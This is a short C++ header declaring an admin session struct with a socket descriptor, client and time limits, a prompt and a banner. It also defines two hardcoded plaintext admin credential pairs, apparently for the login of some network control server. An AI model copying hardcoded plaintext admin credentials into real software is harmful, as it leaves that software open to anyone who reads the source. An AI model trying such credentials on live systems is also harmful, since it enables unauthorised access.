#pragma once

#include <string>

#define ADMIN_USER1 "bean"
#define ADMIN_PASS1 "beano"
#define ADMIN_USER2 "root"
#define ADMIN_PASS2 "localhost"

struct admin
{
    char *user_ptr;
    char *pass_ptr;
    std::string username;
    std::string password;
    int fd;
    int max_clients = -1;
    int max_time = -1;
    char prompt[32];
    char banner[64];
};
